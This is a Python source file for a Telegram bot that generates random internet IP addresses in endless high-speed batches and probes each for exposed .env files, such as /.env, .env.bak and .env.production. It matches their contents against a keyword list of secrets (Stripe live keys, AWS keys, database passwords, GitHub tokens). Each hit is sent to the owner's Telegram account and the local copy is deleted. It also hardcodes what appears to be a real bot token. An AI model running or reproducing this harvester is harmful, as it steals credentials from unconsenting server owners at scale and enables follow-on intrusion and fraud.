import asyncio
import os
import ipaddress
import random
import time
import json
import shutil
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional
import urllib3
from datetime import datetime

import requests
from faker import Faker
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Bot configuration
API_ID = 123456  # Replace with your API ID
API_HASH = "your_api_hash"  # Replace with your API hash
BOT_TOKEN = "8330545350:AAFrJJ5lfnkTHKkMYeFGeX1SxoV4wMvrlls"  # Your bot token
OWNER_ID = 7125341830  # Replace with your Telegram user I
app = Client(
    "ip_scanner_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# Global variables
scanning_active = True
processed_ips = set()
env_results = []
found_envs_list = []

# Create directory for storing .env files
ENV_STORAGE_DIR = "env_storage"
os.makedirs(ENV_STORAGE_DIR, exist_ok=True)

class EnvScanner:
    """Class to scan for .env files and credentials"""
    
    def __init__(self):
        self.keywords = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 
                        'APP_ENV=', 'STRIPE_SECRET', 'API_KEY', 'PASSWORD', 
                        'SECRET_KEY', 'DATABASE_URL', 'SECRET_KEY_BASE',
                        'AWS_ACCESS_KEY', 'AWS_SECRET_KEY', 'JWT_SECRET',
                        'REDIS_PASSWORD', 'MYSQL_PASSWORD', 'POSTGRES_PASSWORD',
                        'FACEBOOK_SECRET', 'GOOGLE_SECRET', 'TWITTER_SECRET',
                        'GITHUB_TOKEN', 'SLACK_TOKEN', 'STRIPE_PUBLIC']
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.timeout = 5
    
    def scan_ip(self, ip: str) -> Optional[dict]:
        """Scan a single IP for .env file"""
        if ip in processed_ips:
            return None
        
        processed_ips.add(ip)
        
        try:
            # Try common .env paths
            paths = [
                f'http://{ip}/.env',
                f'http://{ip}/.env.bak',
                f'http://{ip}/.env.backup',
                f'http://{ip}/.env.txt',
                f'http://{ip}/env',
                f'http://{ip}/.env.local',
                f'http://{ip}/.env.production',
                f'http://{ip}/.env.development',
                f'http://{ip}/.env.staging',
                f'http://{ip}/env.production',
                f'http://{ip}/env.development'
            ]
            
            for path in paths:
                try:
                    response = self.session.get(path, timeout=3)
                    if response.status_code == 200:
                        content = response.text
                        # Check for sensitive keywords
                        found_keywords = [kw for kw in self.keywords if kw in content]
                        
                        if found_keywords:
                            # Extract sensitive info
                            extracted_data = {
                                'ip': ip,
                                'url': path,
                                'timestamp': datetime.now().isoformat(),
                                'content': content[:10000],  # Store first 10000 chars
                                'keywords_found': found_keywords,
                                'lines': []
                            }
                            
                            # Extract relevant lines
                            for line in content.split('\n'):
                                if any(kw in line for kw in found_keywords):
                                    extracted_data['lines'].append(line.strip())
                            
                            return extracted_data
                except:
                    continue
        except:
            pass
        
        return None

class IPGenerator:
    """Class to generate random IP addresses"""
    
    def __init__(self):
        self.faker = Faker()
    
    def generate_random_ips(self, count: int = 1000) -> List[str]:
        """Generate random IP addresses"""
        ips = []
        for _ in range(count):
            # Generate random valid IP addresses
            ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            ips.append(ip)
        return ips

def save_env_to_file(env_data: dict) -> str:
    """Save found .env data to a file and return file path"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    safe_ip = env_data['ip'].replace('.', '_')
    filename = f"env_{safe_ip}_{timestamp}.txt"
    filepath = os.path.join(ENV_STORAGE_DIR, filename)
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"{'='*60}\n")
            f.write(f"ENV FILE FOUND\n")
            f.write(f"{'='*60}\n\n")
            f.write(f"IP Address: {env_data['ip']}\n")
            f.write(f"URL: {env_data['url']}\n")
            f.write(f"Timestamp: {env_data['timestamp']}\n")
            f.write(f"Keywords Found: {', '.join(env_data['keywords_found'])}\n")
            f.write(f"\n{'='*60}\n")
            f.write(f"EXTRACTED CONTENT\n")
            f.write(f"{'='*60}\n\n")
            
            for line in env_data['lines']:
                f.write(f"{line}\n")
            
            f.write(f"\n{'='*60}\n")
            f.write(f"FULL CONTENT\n")
            f.write(f"{'='*60}\n\n")
            f.write(env_data['content'])
            f.write(f"\n\n{'='*60}\n")
            f.write(f"END OF FILE\n")
        
        return filepath
    except Exception as e:
        print(f"Error saving file: {e}")
        return None

async def send_to_owner(client: Client, env_data: dict):
    """Send found .env file to owner and delete it"""
    filepath = save_env_to_file(env_data)
    
    if filepath and os.path.exists(filepath):
        try:
            # Prepare message with found keywords
            keywords_text = '\n'.join([f"🔑 `{kw}`" for kw in env_data['keywords_found'][:10]])
            
            message_text = (
                f"🎯 **NEW .ENV FILE FOUND!**\n\n"
                f"📍 **IP:** `{env_data['ip']}`\n"
                f"🔗 **URL:** `{env_data['url']}`\n"
                f"🔐 **Keywords Found:**\n{keywords_text}\n"
                f"📅 **Time:** `{env_data['timestamp']}`"
            )
            
            # Send file to owner
            with open(filepath, 'rb') as f:
                await client.send_document(
                    chat_id=OWNER_ID,
                    document=f,
                    caption=message_text,
                    file_name=os.path.basename(filepath),
                    parse_mode=ParseMode.MARKDOWN
                )
            
            print(f"✅ Sent ENV file from {env_data['ip']} to owner")
            
            # Delete file after sending
            os.remove(filepath)
            print(f"🗑️ Deleted local file: {filepath}")
            
            return True
        except Exception as e:
            print(f"❌ Error sending file to owner: {e}")
            return False
    else:
        print(f"❌ File not found: {filepath}")
        return False

async def generate_and_scan_loop(client: Client):
    """Main loop for generating IPs and scanning for .env"""
    global scanning_active, env_results, found_envs_list
    
    ip_generator = IPGenerator()
    env_scanner = EnvScanner()
    
    print("🔄 Starting automatic IP generation and scanning loop...")
    print("📊 Generating 1000 IPs per batch - NO SLEEP DELAY")
    print("⚡ Running at maximum speed...")
    
    batch_count = 0
    
    while scanning_active:
        try:
            batch_count += 1
            
            # Generate 1000 random IPs
            ips = ip_generator.generate_random_ips(1000)
            print(f"\n📡 Batch #{batch_count}: Generated {len(ips)} IPs for scanning")
            start_time = time.time()
            
            # Scan IPs using ThreadPoolExecutor
            found_envs = []
            
            with ThreadPoolExecutor(max_workers=500) as executor:
                # Submit all tasks
                futures = {executor.submit(env_scanner.scan_ip, ip): ip for ip in ips}
                
                # Process completed tasks
                completed = 0
                for future in as_completed(futures):
                    completed += 1
                    result = future.result()
                    if result:
                        found_envs.append(result)
                        env_results.append(result)
                        found_envs_list.append(result)
                        print(f"✅ Found ENV at: {result['ip']} - {result['url']}")
                        print(f"   Keywords: {', '.join(result['keywords_found'][:5])}")
                        
                        # Send immediately to owner
                        await send_to_owner(client, result)
                    
                    # Show progress every 200 IPs
                    if completed % 200 == 0:
                        elapsed = time.time() - start_time
                        rate = completed / elapsed if elapsed > 0 else 0
                        print(f"📊 Progress: {completed}/{len(ips)} IPs scanned | Found: {len(found_envs)} | Rate: {rate:.1f} IPs/sec")
            
            elapsed = time.time() - start_time
            print(f"✅ Batch #{batch_count} completed in {elapsed:.2f} seconds")
            print(f"   Found {len(found_envs)} ENV files | Scan rate: {len(ips)/elapsed:.1f} IPs/sec")
            
            # Update statistics file
            stats = {
                'total_scanned': len(processed_ips),
                'total_found': len(env_results),
                'last_batch': batch_count,
                'last_update': datetime.now().isoformat(),
                'ips_per_second': len(ips)/elapsed if elapsed > 0 else 0
            }
            
            with open('scan_stats.json', 'w') as f:
                json.dump(stats, f, indent=2)
            
            # Continue immediately without any sleep
            print("🚀 Starting next batch immediately...")
            
        except Exception as e:
            print(f"❌ Error in scan loop: {e}")
            # No sleep - just continue

@app.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    """Handle /start command"""
    welcome_msg = (
        "🤖 **IP Scanner Bot - MAXIMUM SPEED MODE**\n\n"
        "This bot automatically generates random IPs and scans for exposed .env files.\n\n"
        "**Commands:**\n"
        "/status - Check bot status\n"
        "/stats - Show scanning statistics\n"
        "/stop - Stop automatic scanning\n"
        "/start_scan - Start scanning\n"
        "/get_results - Get all found ENV files\n"
        "/clear_stats - Clear statistics\n"
        "/clean_dir - Clean storage directory\n\n"
        "⚡ **Performance Features:**\n"
        "• **1000 IPs per batch**\n"
        "• **NO DELAY** between batches\n"
        "• **500 concurrent threads**\n"
        "• **Instant file deletion** after sending\n"
        "• **Real-time progress tracking**"
    )
    await message.reply(welcome_msg, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("status") & filters.private)
async def status_command(client: Client, message: Message):
    """Check bot status"""
    # Calculate scan rate from last batch
    scan_rate = 0
    if os.path.exists('scan_stats.json'):
        try:
            with open('scan_stats.json', 'r') as f:
                stats = json.load(f)
                scan_rate = stats.get('ips_per_second', 0)
        except:
            pass
    
    status_msg = (
        f"📊 **Bot Status - MAXIMUM SPEED**\n\n"
        f"🟢 **Scanning Active:** `{scanning_active}`\n"
        f"📝 **Processed IPs:** `{len(processed_ips):,}`\n"
        f"🔐 **ENV Found:** `{len(env_results)}`\n"
        f"⚡ **Scan Rate:** `{scan_rate:.1f} IPs/sec`\n"
        f"🧵 **Threads:** `500`\n"
        f"📦 **Batch Size:** `1000 IPs`\n"
        f"💾 **Storage Dir:** `{ENV_STORAGE_DIR}`\n"
        f"⏰ **Last Update:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
    )
    await message.reply(status_msg, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("stats") & filters.private)
async def stats_command(client: Client, message: Message):
    """Show detailed statistics"""
    success_rate = 0
    if len(processed_ips) > 0:
        success_rate = (len(env_results) / len(processed_ips)) * 100
    
    # Get storage directory size
    storage_size = 0
    if os.path.exists(ENV_STORAGE_DIR):
        for file in os.listdir(ENV_STORAGE_DIR):
            file_path = os.path.join(ENV_STORAGE_DIR, file)
            if os.path.isfile(file_path):
                storage_size += os.path.getsize(file_path)
    
    stats_msg = (
        f"📈 **Detailed Statistics**\n\n"
        f"**Total IPs Scanned:** `{len(processed_ips):,}`\n"
        f"**ENV Files Found:** `{len(env_results)}`\n"
        f"**Success Rate:** `{success_rate:.6f}%`\n"
        f"**Storage Usage:** `{storage_size / 1024:.2f} KB`\n\n"
        f"**Top Keywords Found:**\n"
    )
    
    # Show top keywords found
    keyword_counts = {}
    for env in env_results:
        for keyword in env.get('keywords_found', []):
            keyword_counts[keyword] = keyword_counts.get(keyword, 0) + 1
    
    for keyword, count in sorted(keyword_counts.items(), key=lambda x: x[1], reverse=True)[:15]:
        stats_msg += f"  • `{keyword}`: {count}\n"
    
    await message.reply(stats_msg, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("stop") & filters.private)
async def stop_command(client: Client, message: Message):
    """Stop automatic scanning"""
    global scanning_active
    
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ Only the bot owner can use this command.")
        return
    
    if not scanning_active:
        await message.reply("⚠️ Scanning is already stopped.")
        return
    
    scanning_active = False
    await message.reply("🛑 Automatic scanning has been stopped.")

@app.on_message(filters.command("start_scan") & filters.private)
async def start_scan_command(client: Client, message: Message):
    """Start automatic scanning"""
    global scanning_active
    
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ Only the bot owner can use this command.")
        return
    
    if scanning_active:
        await message.reply("⚠️ Scanning is already active.")
        return
    
    scanning_active = True
    
    # Start the scanning loop in background
    asyncio.create_task(generate_and_scan_loop(client))
    
    await message.reply(
        "✅ **Automatic scanning started - MAXIMUM SPEED MODE!**\n\n"
        "⚙️ **Configuration:**\n"
        "• **1000 IPs per batch**\n"
        "• **NO DELAY** between batches\n"
        "• **500 concurrent threads**\n"
        "• **Files deleted after sending**\n\n"
        "🚀 Scanning at maximum possible speed!",
        parse_mode=ParseMode.MARKDOWN
    )

@app.on_message(filters.command("get_results") & filters.private)
async def get_results_command(client: Client, message: Message):
    """Get all found ENV files"""
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ Only the bot owner can use this command.")
        return
    
    if not env_results:
        await message.reply("📭 No ENV files have been found yet.")
        return
    
    # Create summary file
    summary_file = f"env_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    try:
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write(f"{'='*60}\n")
            f.write(f"ENV FILES SUMMARY\n")
            f.write(f"{'='*60}\n\n")
            f.write(f"Total Found: {len(env_results)}\n")
            f.write(f"Generated: {datetime.now().isoformat()}\n")
            f.write(f"{'='*60}\n\n")
            
            for idx, env in enumerate(env_results, 1):
                f.write(f"{idx}. IP: {env['ip']}\n")
                f.write(f"   URL: {env['url']}\n")
                f.write(f"   Keywords: {', '.join(env['keywords_found'])}\n")
                f.write(f"   Time: {env['timestamp']}\n")
                f.write(f"   Lines Found:\n")
                for line in env['lines'][:5]:
                    f.write(f"      {line}\n")
                f.write("-"*60 + "\n\n")
        
        # Send summary file
        with open(summary_file, 'rb') as f:
            await client.send_document(
                chat_id=message.chat.id,
                document=f,
                caption=f"📁 ENV Files Summary - Total Found: {len(env_results)}",
                file_name=summary_file
            )
        
        # Delete summary file after sending
        os.remove(summary_file)
        
    except Exception as e:
        await message.reply(f"❌ Error sending file: {e}")

@app.on_message(filters.command("clear_stats") & filters.private)
async def clear_stats_command(client: Client, message: Message):
    """Clear statistics"""
    global processed_ips, env_results, found_envs_list
    
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ Only the bot owner can use this command.")
        return
    
    processed_ips.clear()
    env_results.clear()
    found_envs_list.clear()
    
    await message.reply("🗑️ Statistics have been cleared!")

@app.on_message(filters.command("clean_dir") & filters.private)
async def clean_directory_command(client: Client, message: Message):
    """Clean the storage directory"""
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ Only the bot owner can use this command.")
        return
    
    try:
        # Get directory size before cleaning
        total_size = 0
        file_count = 0
        
        if os.path.exists(ENV_STORAGE_DIR):
            for file in os.listdir(ENV_STORAGE_DIR):
                file_path = os.path.join(ENV_STORAGE_DIR, file)
                if os.path.isfile(file_path):
                    total_size += os.path.getsize(file_path)
                    file_count += 1
        
        # Clean the directory
        if os.path.exists(ENV_STORAGE_DIR):
            shutil.rmtree(ENV_STORAGE_DIR)
            os.makedirs(ENV_STORAGE_DIR, exist_ok=True)
        
        clean_msg = (
            f"🧹 **Storage Directory Cleaned!**\n\n"
            f"📁 **Directory:** `{ENV_STORAGE_DIR}`\n"
            f"🗑️ **Files Removed:** `{file_count}`\n"
            f"💾 **Space Freed:** `{total_size / 1024:.2f} KB`\n\n"
            f"✅ Directory has been cleaned and recreated."
        )
        
        await message.reply(clean_msg, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        await message.reply(f"❌ Error cleaning directory: {e}")

@app.on_message(filters.command("clean_temp") & filters.private)
async def clean_temp_command(client: Client, message: Message):
    """Clean all temporary files including stats"""
    if message.from_user.id != OWNER_ID:
        await message.reply("❌ Only the bot owner can use this command.")
        return
    
    try:
        # Remove stats file
        if os.path.exists('scan_stats.json'):
            os.remove('scan_stats.json')
        
        # Clean storage directory
        if os.path.exists(ENV_STORAGE_DIR):
            shutil.rmtree(ENV_STORAGE_DIR)
            os.makedirs(ENV_STORAGE_DIR, exist_ok=True)
        
        # Clear global variables
        global processed_ips, env_results, found_envs_list
        processed_ips.clear()
        env_results.clear()
        found_envs_list.clear()
        
        await message.reply(
            "🧹 **Complete Cleanup Performed!**\n\n"
            "✅ Statistics cleared\n"
            "✅ Storage directory cleaned\n"
            "✅ All temporary files removed\n"
            "✅ Memory cleared",
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        await message.reply(f"❌ Error during cleanup: {e}")

async def main():
    """Main function to start the bot and scanning loop"""
    print("🚀 Starting Pyrofork Bot - MAXIMUM SPEED MODE...")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👤 Owner ID: {OWNER_ID}")
    print(f"📁 Storage Directory: {ENV_STORAGE_DIR}")
    
    # Start the bot
    await app.start()
    
    print("✅ Bot started successfully!")
    print("⚡ MAXIMUM SPEED MODE ACTIVE")
    print("📊 Generating 1000 IPs per batch with NO DELAY")
    print("🧵 Using 500 concurrent threads")
    print("🗑️ Files will be deleted immediately after sending")
    
    # Start automatic scanning
    asyncio.create_task(generate_and_scan_loop(app))
    
    # Keep the bot running
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
